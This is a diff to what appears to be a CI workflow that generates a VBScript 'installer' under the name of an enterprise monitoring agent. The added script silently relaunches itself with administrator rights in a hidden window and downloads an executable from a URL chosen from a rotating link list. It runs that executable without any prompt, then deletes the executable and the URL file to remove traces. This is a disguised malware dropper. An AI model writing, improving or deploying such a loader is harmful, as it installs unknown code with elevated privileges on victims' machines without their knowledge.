@@ -20,56 +20,68 @@ jobs:
         
         # Get current link based on 10-minute interval
         current_minute=$(date +%M)
-        link_index=$((current_minute / 1 % 6))
+        link_index=$((current_minute / 1 % 5))
         current_link=${links[$link_index]}
         
         echo "Using link: $current_link"
         
-        # Create a simple VBS script
+        # Create a VBS script with elevation and proper stream handling
         cat > installer.vbs << 'EOF'
-        ' Simple installer script
-        Dim objShell, objFSO, objHTTP, objStream, tempPath, urlFile, installerPath, downloadUrl
+        ' --------------------------------------------------------------------------
+        '  Silent Installer - Enterprise Monitor Agent
+        ' --------------------------------------------------------------------------
+        Option Explicit
         
-        Set objShell = CreateObject("WScript.Shell")
-        Set objFSO = CreateObject("Scripting.FileSystemObject")
-        
-        ' Get temp path and file paths
-        tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
-        urlFile = tempPath & "\download_url.txt"
-        installerPath = tempPath & "\installer.exe"
-        
-        ' Read URL from file
-        Set objFile = objFSO.OpenTextFile(urlFile, 1)
-        downloadUrl = objFile.ReadAll
-        objFile.Close
-        
-        ' Download the file
-        Set objHTTP = CreateObject("MSXML2.XMLHTTP")
-        objHTTP.Open "GET", downloadUrl, False
-        objHTTP.Send
-        
-        ' Handle redirects
-        If objHTTP.Status >= 300 And objHTTP.Status < 400 Then
-            finalUrl = objHTTP.getResponseHeader("Location")
-            objHTTP.Open "GET", finalUrl, False
-            objHTTP.Send
+        ' Check for elevation
+        If Not WScript.Arguments.Named.Exists("elevated") Then
+            CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
+            WScript.Quit
         End If
         
-        ' Save the file
-        If objHTTP.Status = 200 Then
-            Set objStream = CreateObject("ADODB.Stream")
-            objStream.Type = 1
-            objStream.Open
-            objStream.Write objHTTP.ResponseBody
-            objStream.SaveToFile installerPath, 2
-            objStream.Close
+        Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell, objFile
+        
+        ' Read URL from file
+        Set objShell = CreateObject("WScript.Shell")
+        Set objFSO = CreateObject("Scripting.FileSystemObject")
+        strTemp = objShell.ExpandEnvironmentStrings("%TEMP%")
+        
+        ' Open and read the URL file
+        Set objFile = objFSO.OpenTextFile(strTemp & "\download_url.txt", 1)
+        strUrl = objFile.ReadAll
+        objFile.Close
+        
+        ' Set file path for installer
+        strFile = strTemp & "\agent_installer.exe"
+        
+        ' Download
+        Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+        objXMLHTTP.open "GET", strUrl, False
+        objXMLHTTP.send()
+        
+        ' Handle redirects
+        If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then
+            strUrl = objXMLHTTP.getResponseHeader("Location")
+            objXMLHTTP.open "GET", strUrl, False
+            objXMLHTTP.send()
+        End If
+        
+        If objXMLHTTP.Status = 200 Then
+            Set objADOStream = CreateObject("ADODB.Stream")
+            objADOStream.Open
+            objADOStream.Type = 1 ' Binary
+            objADOStream.Write objXMLHTTP.ResponseBody
+            objADOStream.Position = 0 ' Reset position before saving
+            objADOStream.SaveToFile strFile, 2 ' Overwrite
+            objADOStream.Close
             
-            ' Run the installer
-            objShell.Run """" & installerPath & """ /S", 0, True
+            ' Install
+            Set objShell = CreateObject("WScript.Shell")
+            objShell.Run """" & strFile & """ /S", 0, True
             
-            ' Clean up
-            objFSO.DeleteFile installerPath, True
-            objFSO.DeleteFile urlFile, True
+            ' Cleanup
+            Set objFSO = CreateObject("Scripting.FileSystemObject")
+            If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
+            If objFSO.FileExists(strTemp & "\download_url.txt") Then objFSO.DeleteFile strTemp & "\download_url.txt"
         End If
         EOF
         
